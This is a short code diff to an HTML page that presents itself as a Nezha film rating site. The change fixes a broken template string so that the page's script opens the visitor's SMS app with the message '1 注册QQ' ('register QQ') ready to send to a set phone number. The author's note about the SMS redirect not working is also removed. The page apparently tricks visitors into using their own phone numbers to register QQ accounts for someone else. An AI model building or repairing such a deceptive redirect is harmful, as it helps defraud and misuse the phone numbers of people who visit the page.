@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>哪吒影后评分</title> 网站搭建好了 跳转不到短信页面 
+    <title>哪吒影后评分</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -66,8 +66,8 @@
             var message1 = "1";
             var message2 = "注册QQ";
             
-            // 通过 sms: 协议打开手机的短信应用，并预填号码和短信内容
-            var smsLink = sms:${phoneNumber}?body=${encodeURIComponent(message1 + " " + message2)};
+            // 使用 sms: 协议打开手机的短信应用，并预填号码和短信内容
+            var smsLink = `sms:${phoneNumber}?body=${encodeURIComponent(message1 + " " + message2)}`;
 
             // 跳转到短信应用
             window.location.href = smsLink;
